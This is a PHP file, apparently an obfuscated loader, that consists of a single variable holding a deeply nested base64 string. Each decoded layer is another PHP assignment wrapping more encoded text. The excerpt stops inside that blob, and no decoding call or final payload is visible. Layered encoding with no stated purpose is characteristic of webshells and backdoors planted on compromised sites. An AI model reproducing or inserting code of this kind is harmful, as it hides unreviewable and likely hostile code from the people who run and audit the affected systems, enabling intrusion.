<?php $aJql = ' $VGVo = 'ICRpUGJ2ID0gJ0lDUkZTVmxXSUQwZ0owbERVbkJUTW5neVNVUXdaMG93YkVSVmJHaFhZa1ZaTVZOVlVYZGFNRzkzWWtWU1VtSlVSbkpXYm5CWFkxWndSbHBJVG10aVZYQjNWVmMxVjJFeFdYcGhSRXBhVFVkU1NGa3daRTVsVmxwMVkwVndVazF0VW5sV01WcHZVekpLY21SR1VsSmhiVkpMVlRCV2QyTXhjRVpoUm1Sc1ZqQndkMVZXWXpWVVJrVjRVMjA1V2sxcVJuRlhha1pEVmxVeFNGcEZjR2hoTUZwM1ZYcEdUMk5yZDNkaVNFWlNWako0VVZsV1pHdGlNVTEzVkd4T2FGSXdOVEJYVkU1RFZFWmFSV0ZJUWxkU00yaFlWa1phVTFKR1RsVlhhM0JvVmpBMWQxWkZaSE5WTWtaSVZHNVNXazB4V2t0WlZtUlBZMFpSZW1KRlRsQldWM2hGVlZab1lWUkhSbFpUYTJ4WVlrZE5lRmxyWkU5a1JrcDBaRWRzYkZaVmNIaFhWM0JLVFVadmVHSXpiRmRpYkZwb1ZqQldkMkl4WkhKWmVsWnNWbGQ0UjFWdE1UQmhhekI0VjJwQ1ZGWlZOWFpaVjNRd1ZrVTFTRnBGY0ZOV2JUazBWMWN3ZUZReVRraFRXR3hQVWtad1ZsVnVjSE5pTVdSeVlVVk9hRkl3V2xwV1J6RTBZVzFXVmxOcldsaGlSMmhRV1ZjeFQyUkhTa2xhUm5CT1lsaG5lVmRYTVhka01VWnpZVE5zVldKWWFIRlVWM1JYWW14a2MxcEVUbUZOVmxvd1ZtMHdNV0ZHWkVaT1NHUmFUV3BCTUZkcVNrZFhSVFZZWkVkb1YwMUVWblpXTW5ScVRrWnZlR05GYUZkV01sSndWV3BDVjJKc2NFWmFSV1JvVmpCd1NWVnNaR3RUYkVweVUyMDVXazFxUmtoYVJWcDNWMVpXZFdKSGJFNU5SRUY1VmxkMGExWXlWbk5oTTNCVVltdEtjVlZxUVRGa01XeHhVMVJDWVUxSGVFVldWelZEWVVaYU5sWllaRnBOUjFKSVdUQmtUbVZXVW5WWGJVWlRUVzVvTVZkWGNFTlVNa1pJVTJ4c1VtSnNjRXRWTUZaTFlqRnJlVTVXVG1sU1YzaEpWbGN4TkZOc1NYcGhSemxVVmxkUk1GbDZSbk5YVm1SMFpVVndWRkpWYnpGWFZscHFaVWRHU0ZSdVVtbFNNbWhMVlZSQ1MxWkdaSE5oUms1cllsVTFNRlJzYUdGVlIwWldVbTAxVjJFeGNFeFdiWGhMVmpGT2RHVkhSazVpV0djeVYydFdiMU15VW5KaVJXeFZZbXh3Y0ZWcVNqUmpWbXhYWVVaT2FGSnVRa2xVTUdSclZUSkZkMWRyTlZkV1JVcFlWVzB4VDJSV1RuVlhiWEJvVmxWd2VWWXllRTlSTWtaWFlrWnNWV0pZYUV0VmFrWkxZekZPVmxwR1RtaFNNVXBKVkRGb2QxTnNTalpoUnpWWVlUSlNWMWRxUm5KbFZUbFpWbTFHVjAxRVZuaFhWbVJXWTJ0M2VsZHNhRTlTTWxKTFZXeFdXbVZHY0VaWmVsWnNWbFJzZWxWWGVGZFdhekZHVFZjMVZtSlVSbGhaVnpGSFUwWktWVmRyTlZkU1ZWbDNWbXhTUzFZeVVYbFZhMmhYWW14S1lWbHNXbUZPVmxKSFZXdHdhMDFFUmtaV1JtUnJVMnhLV0dGSVpGcGxhelZVV2tjeFQyUkhTa2hoUlhCVFRWVndlbFV4VmxabFIxSnpZMFZvYVZKNlJtOVdha0V4WWpGa1ZWTnVUbXRpVlhBd1ZtMDFkMU5zU2xkalNFNVlWa1Z3ZGxsVlZuTlNiRXB4VW0xMFUyVnRkekZWTVZaV1pVZFNjMk5GYUdsU2VrWnZWbXBCTVdJeFpGVlRiazVyWWxWd2QxVldaR3RVUjBaVllVYzFXR0pVVmxoYVJscHlaV3hXZFZGdGJFNWhiRXAxVjFkMGFrNVhSa2RqUld4VVlsaG9ZVlJYY0hOT1ZtUnlZVVZPYUZJd1dscFdSekUwWVcxV1dGcEhOVlJoTWxKNldUQmtTMlJXVm5WYVJuQlhUVzVuTWxZeFVrcE9WMFY1VW14b1lWTkdjRTVWVkVaTFRWWndSMVpyT1d0aVZYQXdWR3RrYTFSR1ZYZFRWRTVVVmxVMVJGbFVSbmRYUm1SMVVXMXNhVlpzV2pKVk1XTjRWakZ3YzJFemJGQlhSbHB3V1d4YVlXTldjRVphU0U1cllsVndkMVV4YUU5VVZscEdWbTVrVlUweWVFUlpWRVozVjBaa2RWRnRiR2xXYkZveVZURmplRll4Y0hOalJXaFVWako0VGxWWWNFTk9WazE0Vlc1d1lVMVlRa2xXYlRCNFlVWmFObFp1VGxSTlJUVk1XV3RhYm1WV1duVlZiWEJVVW10cmVGVXhaSE5OTWxKR1RWUldhR1Z0VWt0VmFrWkxZekZrZEUxWVRtdFdia0pWVjJwS2MxZHJNWE5YYWxaYVltMTRTMWw2UVhoU1IwWTJXa1Z3VWsxRmNETldNakZ6VVcxSmQyTkZhRTlXUlZwVFZGZHdjMDFXYkhSaVNFcGhUV3haTVZWV1pEQmhhekZ5WTBaV1drMVhVWHBYYWtaRFZrWkdXR0pHV2s1U2JIQlBWbGQ0VjFReFdsWmlSVkpwVFcxU1ZGbHJWbmRWVmxwSFZHdE9hMDFYZUZsWmEyaDNXVlprUmsxWE5WZGhhMHAyVlcxNFYyTnNXbGhhUjNCVFRVWndNMWRZY0V0VU1sSnpZMFZvYVZKNlZuQmFWbFpHVGxaT1ZsUnJTbWhXV0doM1ZURmpNVk50UmxWVmJrcGFWbTFTZWxwR1pGTlRWa1owWVVkb1dGSlVWbmhYVjNCTFZUSk9SMkl6YkZCVFJscExXVlprVDJOR1VYcGlSVXBoVFVoQ1NWUnNVa2RXYlVwWFYycGFZVkp0VVRCVVZWWnpVbFV4U0ZwSGNGTk5iRXAwVmpKNGIySXlTa2RpUkZaaFRXNVNjRmx0ZUdGU1ZteHhVMVJHYTFaWWFFVldWelYzVjIxS1JrNVVVbHBoTURWNVZHcENjMUpHUm5GU2JXeHBZWHBXZWxkclZrOWliVVY1VkZoc1ZHSkdTbkZXYWs1clpERlJlbUpGVG1wU2JrSjNWVlpqTlZNeFNqWldXR2hYVm5wR1dGcFhNVk5YUjFaRlVXdDRWazFGYTNwVk1WWlBWVEpTV0ZWc1dsVmlWMmh3V1cxNFMxWkdiSEZVYlhCaFRWVktWVlZYTld0WlZURlZZa1JHWVZKdFRqUmFWbVJLWld4d1NXTkZlRkpOVlc5NFYydGFZVk15U2toVVdIQlhZbXMxY2xWVVNucE5NVTVXVkd0T2FsSnVRbmRWVm1NMVV6RktObFpZYUZaV1JYQklXa1prVTFJeFRuVlhiWFJzVmxWV2VWVXhWbXRVTWtwSVZHNVNVRk5GU2t0Vk1HaFBZbXhPVmxSc1RtdFdNVXBYVmtjeGIyRlhTbk5UYTJoYVZtMVNXRmw2Um5kVFZsSllXa1pHVmsxRmIzcFdNbkJHVGxkU1dGVnNhRTVXZWtadlZtcEdZV1ZzWkhKaFJUVnBUVWhDU1ZSc1VrZFdiVXBYVjJwYVlWSnRVVEJVVlZZd1ZsZE5lVnBGZEZSU1ZGWjNWbXhqZDA1Vk1IZGlSVlpPVWpKU2NWVnFTbE5pVm1SMFRWWmtUbEp0ZERWWlZXUmhZVzFLVldFemNGUldWVFYxV1ZSS1MyUldXbk5VYlVaWVVsUlNORmRYZEc5VmJVMTRZVE5zVjJKdGVIQmFWbVI2VFRGT1ZsUnNUbXhpUjNoNVdsVm9RMkZyTUhoVGJUbFVWbFpHTTFkcVJuTlhWazUxWWtad1dGSXpVakpWTVZaUFV6SlJlR0pHYUdsVFNFSmhWRmR3YzJOc2JGZGFSM1JyWVRKNGVGUlZUakJUTVU1R1RsaENWMVo2UVRGVVZFWnJUbXhHZEZWck1WSk5SVnAzVjFSQ2ExSXlUa2hVV0d4UFYwWndjRlpxUW5kT1ZtUnpWR3R3VUZaclNuZFdWelYzVjIxS1JtTkVTbUZTUlZvMldsVmFiMVpIVVhsYVJYQnBZVEJ3ZGxkV1dtOVVNa3BYWTBab1ZXSlViSEZaYkZwaFpGWnNWMVJyY0ZCV2EwcDNWbGMxZDFkdFNrWmpSRXBoVWtWYU5scFdXbTlXUjFGNVdrVndhV0V3Y0haWFZscHZWREpKZVZOWWNGUmlWMmh4V1d4YVlXUldiRmRVYTNCUVZtdEtkMVpYTlhkWGJVcEdZMFJLWVZKRldqWmFWM2h2VmtaR1dWRnNRbXhXVlc4eFZqSjRiMVV3TVZoVWJsSlBVakpTVEZVd1ZURmpSbHBHV2toT2JHSldTa2xWYkZKclUyeE9SVkZ0TlZoaVIxRXdXbGQ0ZDFaR1JuRmFSWEJTVFVWdk1WWXllRzlWTURGWVZHNVNUMUl5VWt0VmFrWmhZbFprYzFremFHdE5iRXBLV1Zod2ExTnNSWGRUVkZaVVZsZGtNMWRxUm5kWFIxWkpZMGRHVmsxRmEzcFZNVlp2VXpKS1NGVnJiRmRpYlhod1dWWldSMkpzWkhOWFZGWm9UVmQ0ZUZsNlNtdGlWbFYzVTFSV1ZGWlhVbGhaZWtwT1pWWmFXRnBIZUd4V1ZXOHhWako0YjFVd01WaFVibEpQVWpKU1MxVnFSbUZpVm1SVlUxUldhMVl3Y0RCV2JURjNZVEZKZVdWRVNscGlXRUkyVjJwS1lWWkdSbkZpUlhCU1pXMW9ORlV4VmxkaE1rcElVMjVTVjJKdGVHRldha1pMVFd4T1ZscEZPV3RpVlhCM1ZWY3dNVmxXV2paV2JrNWFUV3BHU0ZsVVNrcGxiRTVZV2taS1YwMVZiekpYYTFwcVpERnZkMlJGYUZWWFJVcE9XVlpXUjJKc1ZuUk9WbVJyVm0xME5WbHJhR0ZoVjBaMVVXNVNZVkp0VVRCWmVrcE9aVlpTZEdGSGJHbGhNSEIyVjFaYWIxUXlTa2hVYWxaU1lURmFhRll3VlRGalZtdDVUVmhPYTAxWGREVlphMmhoWVZkR2RWRnJUbGhXUlhCUVdXdGtUbVZXU2xoYVIzUlRaVzE0ZVZkWGNFOVViRzk1VTJ0b1VGZElRa3RWYlhSM1l6RmtjVk51VG14aVZrcEtWVEkxWVdGdFZsWlNiVFZZWVRKU1YxZHFTa3RUUmtwWVdrZDBVMDFHY0hkWFYzUnJVbXh2ZDJKRlpGSmlWMmh4V1d4V1lVMUdaSE5oUms1c1ZqQnNObFpHVW1GVk1VbDRWMnBhV0ZaRk5VeFpNR1JQVTBaU2RWRnRiRTVoYkVwMVZURldUMUV4VlhoalJteFdZbXh3Y1Zsc1VsZE5iRkY1WWtWS1lVMVdjRWhWTW5oaFZURmFXR1ZJU2xSV1YxSlVXV3RXYzFOV1ZuVmlSbkJYWld4Wk1sWXhXbXRVTWtaMFVteG9VRmRHV2t0VmJGcDNVVEZhUmxkck9WTmlSWEJhVlRJMWMyRlZNSGRpUnpWWVlUSlNWMWRxUm5Oa1JrcDFZMGRHVmsxRmNIbFdNbmhQVVRKRmVHSkdiRlppYkhCeFdsWldTMDFzVGxaYVJrNXBVbGQ0U1ZaSE5XRmhWMHBYVjI1R1dGWkZjREZhUnpWYVRUQXhXVlpyY0ZKTlJYQkVWMnRhYjFVeVVuUlVia1pxVW10YVdGVnRjekZTVms1V1ZtMUdhVkp0ZERWWlZXUnZWVWRHY2xacVRsVlNiSEJRV1d0a1QxTldWblJsUjJ4WFRVaENlbGRVU25Ka01sWldUVlZXVWxkSVFrdFZWRUpMVTJ4c1YyRkZPVTVTTUd3MlZUSTFRMWRzVlhkVGJrcFlZa1UxUkZaSE1VcGxWbFoxVVcxR2FWWXphSGhXTVZwclZESk9TRk5ZYkU5V00yaHhXbFpXUzFOR1pITmFSVGxwVFZkNFZWVlhkRXRoTVdSSFUycEtXazF0ZUVSV1J6RktaVlpXZFZGdFJtbFdNMmg0VmpGYWExUXlUa2hUV0d4UFVqSlNTMVZVU1RWTmJFNVdXa2RHVGxZd2NEQldSM0JEWVVaYU5tSkVSbFJXVjFKb1ZGWmtTMU5IVmtsalJuQk9ZVEZ2ZUZkVVFtdFNNazVJVkZoc1YySnVRazFWVkVaTFRWWndSMVpyT1d0aVZYQXdWR3RvUTFOc1RrbFViVFZVVmxkU1ZGbHJXbmRrUjBwSlZtMUdWazF0VW5kV01uaGFUbGRHZEZOWWJFOVhSbHBvVm1wQk1HUXhiRmRaZWxaclZsZDRkMXBFVGxOVWJGVjVZM3BPVkZaWFVsUlphMXAzWkVkS1NWWnRSbFpOYlZKM1ZqSjRXazVYUlhoaVNFSlVWMFUxVGxaclZuTmtNVkY2WWtWT2FFMVlRbGxXTWpWRFlWZEtWMVp1V2xSV2VrWllWMjE0ZDFkRk1WbGFSM1JVVWpOU2QxWkZWazVrTWxaeVpFWldhazF0VW1oVmFrWmhaRVpzVjFsNlJtbFNXRkpGVlRJeGQxbFdaRVpqUkVwVVZqSjNlbHBFUWpCV1YwMTVXa1Z3VTAxdWFEQlZNVlpQWW0xRmVWTnVWbGRoTVVwd1ZGZHdWMDFXVFhoVWEwNVBUVWQ0UlZaWE5YZFhiVXBHVGxSU1dtRXdOVU5VTVZaelVrWk9jMVZzVGxkWFIyaElWbFpTUjFWc2IzZGtTRUpTWVRKU1YxbFljSE5VTVU1V1lVVk9hRkl3V2xwV1J6RTBZVzFXVm1GNlRsUldWVFZEV1ZSS1MyUldXbk5VYlVaWVVsUlNORmRYZEc5VmJHOTRVV3hTVW1KdFVtaFVWbEp6WXpGd1ZscEdaR2hoTTFKRlZsYzFWMkV4V2xaT1ZFcGFZbFJCZDFsNlFuZFRWbEowWWtaYVRrMUdjRFpWZWtaVFpXeHZkMkpGYUdsU2VrWkxWVlJLYTJOc2JIUk9WbVJXVFZoQ1dsWkhjRWRoVms1SFVtNWtWRlpYYURaWGFrSjNVMFUxVlZKc1NrNWhNVzk0VjJ0V1lWTXlVblJWYWxaU1ZrZDRTMVV3Vmt0a1ZtUkZVMVJHVGxZd2NGcFZNalZoWVRBd2QwMVlXbFJoTWsxNFZGWmFWMlJHV25WalIzUlhUVEprTTFWNlJsTmxiRzkzWWtWc1YySnNXbkZVVjNoYVpERk5kMVJzVG14aVIzaDZWa2MxYjJGV1JYbGplazVVVmxkU2VsbHNWbk5TUm05NVpFZHNhV0pHY0VaV01WcHFUVlV4UjFadVVsQldSVFZMVld0U1UySnNaRlZUYkdSc1ZqQnZNVmxVU210aVIxWldVbTAxV2sxcVJsaFVWV1JUVjFaT2RWWnJjRkpOVlc5NFYydGFZVk15U2toVVdIQlhZbXMxY2xWcmFFOWliSEJ6Vkd0T2FWSXdjRXBXUnpFMFUyeE9TVlJ0TlZSV1YyaE1XV3RrVTFOV1duVmlSMnhvVmxWYWRWWXllRnBPVjBwSVUyeHNVbUZyU25OV2EyaFBZbXhPVmxvelpHRk5iSEJWVlZjeE5HRldUa1pPV0U1VVZsZG9ObGRxU2s5a1JscHhVVzEwV0ZKWVFYaFZNVlpQVVRKS1Ixb3piRlppVjNoUldsWldTazVXVGxaYU0yUmhUVmhDV1ZwVmFIZFpWbFYzVTFST1ZGWlhhRXhaYTJSVFUxWmFkV0pIYkdoV1ZWcDFWako0V2s1WFJuUlRXR3hQVjBaYWFGWnFRVEJrTVd4WFdYcFdhMVpVYXpGVlYzQnpVMnhPUlZGdE5WVlRSM2d5VjJwR1NtVldXblZXYlVaWVVsaENkbFl5ZEdwT1JtOTRZVE5zVUZkR1drdFZha3BUWXpGc2RFMVdaR3hXYlhoWlZsYzFZV0Z0UmxaVGEwNVlZVEpvVUZSV1pFdFdSa1pZVDFad2JGWXpVWGhWTVZaUFVURkplVlZzYUU5V00wSnZWbTV3YzAxV1VYbGxSVGxxVWpCd01WWlhNVzlpUmtsNVpVUmFXazFIVWtoWk1HUk9aVlphZFdORmNGTldhM0I2VjFod1MxUXlWbGhTYkd4U1lsaENiMVp1Y0hOTlZsRjVaVWRHYVZJd05UQlphMk40WVVaWmQwNVhPVlJXVjJoUVdUQmtTMlJXVm5SaFIzaFRUVzVuTWxVeFZtdFZNa3BHWWtWb2JGSXlhRXRWYWtFeFRXeHNkRTVWT1U1V01IQktWbGN4YjFOc1NYaFhha1pVVmxkU1ZGa3daRXRrUmtwMVZXMW9WMDFFVmxaV01WSkxVakpTVm1KRlVsSmlSVnBoVmpCV2QySXhiSE5hUm1ST1VqQTFNRlF4YUhkVlIwVjRVMjVPV21WcmNGQmFWbVJIVjFaR2RHTkhhRmRsYlhkNFZURldUMUZ0UlhoaVJteFVZbFJXV0Zsc1ZtRmxiR3h4Vkd0d1lVMVlRa2xXYlRWUFUyeEpkMDVYT1ZwaVIyaEVXa2QwYzFKR1ZuUmpSbkJYWld0WmVsZFhjRUpOVjFKMFUyeG9WR0p0ZUdoV1ZFSkxZMnhrYzFwRVRtRk5WM1ExVlcwMVUyRnNTalpoUnpWVVlUSlNhRmw2Um5OWFJuQkpXa1p3VjAxdVp6SldNbmh2VkRGRmVHSkdhRTlXTTFKb1ZqQldkMkl4VGxaaFJXUk9WbTVDVlZWWE1UQlpWbGw0WTBoa1dtSlVSbGRYYWtwT1pWZEZlVnBIY0U1aVJscDFWMnRhYjFVeVRraFRhMmhwVWtad1lWWlVRa3RSTVZwSVpFWktZVTFIZUVoVk1qRTBZVEZLTm1KRVZscGlWRUV3VkcxMGMxSkdSbk5XYkZwcFVteHdTRlV4VmxkWlZrWnpWV3RrVldFeGNFdFZWRUpMVVRGd1IyRkdUbXRpVlRWNFdUQmtiMkZ0U2xobFJ6bGFaV3R3VUZwSE1VOU9Wa1p5V2tkR1YwMUVWakpXTVZwVFpHMVdSazFWVWs1V2JFcG9WakJXU21ReFpITlpNMmhvVm01Q1dsVXhhRk5VYlVaeVVtcE9WVmRIZUVOWGFrWlBVMGRLU1dOSGRGTmxiWGN4VjFaYWExSnNiM2hqUldoWFZqSlNWbFp1Y0hOamJHeFhXa2RHYWxKdGREVlZiVEYzWVVaYU5tSkVSbGhpUjJoUFYycEdTMlJHV25SalIyaFRUVVphZFZaV1dtOVdNREZJVTFod1ZGWXlVbFpXYm5CelkyeHNWMXBIUm1wU2JYUTFWVzB4ZDJGR1dqWmlSRVpVVmxVMVExa3hWalJPVmtaMFRWZDBWMlZzV25oWGExWnJZekpTZEZOdVFsSmlia0p2Vm01d1ZtUXhaRmRoUnpscVVqQXhObFZYTVc5aFJtUkdUbGhPV2sweWVFTlpha0ozVTBaS2RXSkhSbXhYUjFKMVZUSjBhMVF5UmtoVGJHeFNZbXh3VGxWVVFrZGtSazV5V2tkR2FrMVhlRmxYYTJoclYyeFplV1ZFV2xoaVIyaFBXVEJXYzFOWFRYbGFSMmhYVFZkNGRWVjZRazlWTWtwWVUydG9VMkpVVm5GVmFrSmhaREZzTmxOc1pHeGhNMUpWVlZkd2ExTnNSWGhUYlRsaFVtMW9kVmRxUmtOV1JrWllZa1pLVjFaR1drZFZNV1IzWld4dmVWZHNVbEppYTBwb1dWWldSMlJzVG5KYVJXUnNWbTVCTWxSVlVuTlRiVVpXWWtoa1ZGWlhhRFpYYWtwUFpFWmFjVkZ0ZEZoU1dFRjRWVEZXVDFOdFJsWlBWRlpTWVcxNFMxVnFSbUZsYkd3MlUyeGFZVTFzV1RGVlZtUXdXVmRLV1dGSE9WaGhhelZFV1ZWa1IxZFdVblJsUjNCc1ZsVlZNVlV4VmxOU2F6UjNZa1ZzVkdKWWFISlZNRnBoVGxac2RHSkZTbWhOVjNoYVZtMXdVMVJYUmxaaVJ6VlVWakp6ZDFsVVJuSmxWa3AxVlcxd1UyVnRaM2hWTVdSelVUSk5lVkpzYUd0U00yaExWVlJLVDJNeFRsaGhla0pvVFZkNFdsVXlNREZVVjBaV1lraE9WR0p0ZUV0VWFrSnpVMVV4U0ZwSE1WWk5SVmw1VlhwS2MxRXhUa2RqUm1oUFZqTm9jVmxzVm1GamJHeDFZa1ZPYUdKVmJEVlVhMlJyV1ZVeGMxZHFSbGhpUjJoTVdWVmFkMU5GT1ZsaVJYQlRWbFp3ZVZkWWNFOVdNbEpHWWtWU2FGSXpRazFXV0hCVFlteE9WbFp0Ums1V01IQXdWa2MxUTJGVk1YRlZWRXBXWVRKU2VscEdXbk5YUlRGWlVXeHdUbFpVVm5oV01WcHFUVmRSZUdKR2FHbFRTRUpvVmpCVmVHSnNWbkphUm1Sc1lrZDBObFV5TlVOaGJFbDNUbGhrV21GcmEzZFViWGhIVjBaU2RHTkhSbGhTVkZaMlZURldhMVl5VFhkaVJXeFVZbGhvYUZSWE1UUk9iSEJHWVVWMGEyRXllRXBWYlhCSFdWWlZkMU51V2xoV2JWSlFXV3RXYzFORk1WaGhSM1JUVFVSV01sVXhWbXRVTWxKMFUyNUNVbUpyTldGV1ZFSkxZekZzZEU1V1RteFdiWGhaVmxjeGIxTnNSWGRUYkVwWVZtMW9URmxWWkV0WFJscHhVVzF3YVZaSGR6SldSRW93VlRKS1NGUlliRlZpYlhodlZqQldTMk5XYkZkWmVsWnJWbGQ0UlZWV1pEQmhSbGw1WlVSR1lWSlhhRVJaVldSSFYxWlNkR05IYkU1aVJYQXpWakp3U2s1V1NrZGlSbWhPVjBkU2NGcFdWa3ROTVdSWFlVVjBUbEp1UWxWVlZ6RXdXVlpWZDFOdWNGaFdhelZFV1hwS1MxTkdTbkZUYlVaV1RVVnZlbGRVU1hoak1sSkhZa1pzVkdKclNtRldWRUpIWW14YVdFMVdaRTVTTUd3MlZUSTFWMkZYVm5SUFZ6VlVWbFp3VkZaVVJtRldiRnB5WTBkR1VtVnNTblZXTW5SclZteHZlVlZyYkZSaVYyaHdXVzF6TVdJeFpGVlRhemxxVWpCc05WUnJhRmRUYkVwWFkwVk9WMUpXY0ZCVmJYaExWMVpPZFdKSGJFNU5SM2gxVmpKMGExWnNiM2hpU0ZKVFltNUNhRlpVUWt0amJHUnpWR3RPYUUxWGVGcFdWelZoWVcxV1ZsTnFTbFJXVjFKVVdXdFdjMU5HVW5WWGJXeHBWbXh3ZUZZeFVrdGtWMUoxVjFST1RsZEdXa3RWVkVKTFVURndSMkZHVG10aVZUVjRXVEJrYjJGdFNsaGxSemxhWld0d1VGcEhNVTlPVmtaeVdrZEdWMDFFVmpKV01WcFRaRzFXUmsxVlVrNVdiRXBvVmpCV1NtUXhaSE5aTTJob1ZtNUNXbFV4YUZOVWJVWnlVbXBPVlZkSGVFTlhha1pQVTBkS1NXTkhkRk5sYlhjeFYxWmFhMUpzYjNoalJXaFhWakpTVmxadWNITmpiR3hYV2tkR2FsSnRkRFZWYlRGM1lVWmFObUpFUmxoaVIyaFBWMnBHUzJSR1duUmpSMmhUVFVaYWRWWldXbTlXTURGSVUxaHdWRll5VWxaV2JuQnpZMnhzVjFwSFJtcFNiWFExVlcweGQyRkdXalppUkVaVVZsVTFRMWt4VmpST1ZrWjBUVmQwVjJWc1duaFhhMVpyWXpKU2RGTnVRbEppV0ZKdlZtNXdWMkl4YkhOYVNFNW9ZbFV4TlZaSE1XOWhWMHB5VTIwNVdsWnRhRkJaYTJSUFRsWkdXRTlWY0ZKTlZYQXpWMVJKZUZReFZYaGpSbWhWWW14d2NWbHNXa2RsYkU1eVdYcEdUbFpyVmpWVU1XaFhZVmRHVmxKdVpGUldWMmcyVjJwR2QxTkdXblJOVjJoWFpXeGFlbFY2UWs5VE1rcEhXak5zVldKc2NIQlpiRkpYWXpGa1ZWUnNUbXBTTUd3MVZHdGtjMVJXUmpaUmFsSlVUVlpLTmxkcVJuZFRSbHAwVFZkb1YyVnNXbnBWZWtKUFV6SktSMW96YkZaaVYzaExXVlpvYTAxR1VsaGlTRXBQVFVkNFNWWlhNVFJaVjBwWVpVUkdXR0pGTlhWWlZscDNWakE1V0dWSGJGaFNWV3d6VjJ4YVQxTnRUWGRsUmxaVlYwVktVVnBXVmt0amJHUnpXa2RHYWxJd2NEQldiR00xVTIxS1ZrNVlUbHBOYWtFd1dWWldORkpXUmxsUmJFSnNWbFZhZVZZeU1IaE9SMFpIWWpOd1VtSlhhRzlXTUZVeFl6RnJlbUpGU2xCV1YzaEpWa2N4TkdGdFNsVmFlazVVVmxVMVJGa3dXbmRqUmtaWVQxVjBVMlZzVmpSV1ZsSktUbGRTV0ZOdVFtaE5iVkp6V2xaV1IySnNUbkpoUlRsb1ZteFdObFZ0TlU5VGJFcEZVVzAxVkZZemFGQlZiWGhUVW14YWNsVnNaRkpOUlZvMFZURldWMWxXVlhoVldHUk9VakpTY1ZWcVFtRmtNV3cyVTJ4a2JHRXllRWhYYTFaelZURmFjbU5GWkZSV01uTjNWMnBLVG1WWFNrbFdiWFJUVFVacmQxZFdXbTlVTWxGNFlrWm9hVk5JUW1oV01GVjRaR3hPY2xwSVRteFdiWFEwVlRJeE5GZHJNWEZpUkZaWVlURnZkMXBFUm5OWFIwcEpZMFp3VG1GdGVIbFhWbHByWVRKU2MyRkdVbXROYlhoeFZXcENZV1F4YkRaVGF6bHJZa2hDU1Zscll6RmhWMVpXWWtod1ZHRXlVbWhaZWtaelYwWndTVnBHY0ZkTmJtY3lWako0YjFSdFRrWmxTRUpTWW01Q2IxWnVjRlprTVdSWFlVYzVhbEl3TVRaVlZ6RnZZVVprUms1WVRscE5NbmgxV1ZSS1IxZFdUblJqUmxwcFZteHdlRmRYY0U5VE1rVjRXVE53VW1KWGFHOVdNRlV4VFZac2NWTllhR2hXTURVd1ZtMHhVMVJXUlhkalJFNVlWbTFTZWxwWE1VdGtSVGxaVld4d2FXRXpRbnBWTVdSelRUSkZlR05JVW14U01taG9WRlJDUzJJeGJGZGhSVGxwVWpBME1WbFVUbGRUYkU1R1RsaGtXbUpVVmxSWlZXUlhVMGRLU1dOSGNGTk5SbkF6VjFod1MxWXlWbkprUlZKV1ltdEtjVmxzVlRGV1JtUnpXa1U1YTJKVk5UQldWekZMWVd4SmQxZHVaRnBsYTNCb1dXdGFjbVZYUmtsaVIwWlhUV3hLTTFZd1drOU5Na1pZVkd0b1UySnJTbkZVVjNoM1l6RmtWVk50T1d4V2JrSlpWMnRvUTFOdFJsbGFTRXBZWWxSRk1GbFZXblpsYkVaMFlVZG9XRkpVVm5wWFZFNXpZMjFTVm1KRmJGVmlhMHB3V1cxNFMySXhjRlphU0U1c1lsVTFTVlZ0TlVOaGF6RnpWMnBhVkUxRk5WUlpNR1JQWkVaU2MxUnRSbGROUkZWNVYxUkplRlV4YkhSVWEyaFRZbXRLY1ZSWE1XOU5iR3Q1VFZWa2JGWnVRbGxYYTJoRFYxWlZlbHBJUWxwTlIxSklXVEJrVG1WWFJrbFhiWEJwVmxadk1WWXllR3RoTWs1R1lraENhMDF1VW1oWmJHaHZZakZrY1ZSclRtaFNNRnBhVmtjeE5HRnRWbGhqZWs1VVZsVTFRMWRxUW5kVFJUVlZVbXhhYVZac2J6SlhhMXByVGtVeFJtSkZWazVTTWxKeFZXcEtVMkpXWkhOaFJ6bHBVbTEzTVZkcVNqQmhWMHB6VjJ0V1dtRnJhM2hhUmxZMFVrWldkV05HY0dsU1ZGVXdWMWQwVDJOck5IZGlSVkpTWVd0YWNGbHRjekZqTVhCR1ZHMDFhRTFyTVRWVk1uaFRZV3haZWxwSVpGVk5NbmhEVjJwS1IxZEdaRmhhUlhoU1RWVnZlRmRyV21GVE1rcElWRmh3VjJKck5YSlZWRW93WW14d1dXSkZTbWhOYTNBeFZtMTBVMWRzV2paV1dHUlhWbnBCTVZSVVFuTlNWVEZJV2tkd1UwMXNTblJYVnpBeFZqSlNTRlJ1VWxCV1JUVnhXbFprYTJOc2JIUk9WbVJXVFZoQ1dsWkhjRWRoVms1SFVtNWtWVTB5ZUVOWGFrcEhWMFprV0ZwRmVGSk5WVzk0VjJ0YVYxUXlSa2hUYmxaV1lrVTFjRlJVU2s5aWJGWklZa1ZPYUdKSVFscFZNalZoVkVaVmQxTlVUbFJXVlRWRVdsWmFkMWRXVm5GU2JYQnBWa1pLZFZVeWRHcE5WVEZYVm01U1YySnVRbkpXYWs1dVpERlJlbUpGVGxCV1YzaEpWbTAxVDJGck1YTldiVFZoVjBkNFExZHFTazlrUmxweFVXMTBXRkpZUVhoVk1WWlBVVEpLUjFvemJGZGliRXB4VlRCYVNrMVdVWHBpUlVwaFRXeHdWVlZYY0hOVGJFbDRWMjV3V21WcmNGZFhha3BYVGxaR2RXSkhSbGhTYTJ3MFYxUkpkMDFHYjNkaVJXaFhZbFp3YUZWcVFuSk5NVTVXV2pOa1lVMXNjRlZWVnpFMFlWWk9SazVZVGxSV1YyZzJWMnBLVDJSR1duRlJiWFJZVWxoQmVGVXhWazlSTWtwSFdqTnNWV0pzY0hCWmJGSlhZekZrVlZSc1RtcFNNR3cxVkd0U2ExTnNUa1ZSYlRWaFlrVTFRMXBIZERCalJrWnlZVWRHVjJWc1ducFhWRWw0VWpKRmVWTnFWbEppV0VKd1ZGZHdVMkpzWkhGVGJHUnJWbTVDV2xVeU1XOVpWa28yWWtSV1ZGWldXa2haVkVwT1pXeGFkVlZyY0ZKTmJXaDRWWHBHVGsxR2IzZGlSVnBZWVd0YWNGbHNWVEZrTVd4eFUxUkNUMkpHVmpWWmEyaFhZVEZKZDFkVVFscFdiV2hRV2tjeFQxTldSblJoUjJoWVVsUldlbGRVVG5OUk1VcFhZMFpzVldKWVFuRlpiR1EwVFRGa1ZWTnVUbXRpVlhCNFdUQmFhMWxXWkVaalNHUllZbFJHZWxsWGVITldSa1oxWTBkb1YyVnNWak5XTVZwdllqSk9TRlJxVmxKaVdGSm9WbFJDUzJWc1pGZFVhMDVvWWxWc05WUnNhSGRoTVZsNldqTmtXRlpyTlVSWmEyUkxZMFpHZEdSSGFGZGxiRnAyVjFkNGEyTXlSbk5XV0d4VllsZG9jRmxXVmtkaWJGcFdXa1ZrYkZadGV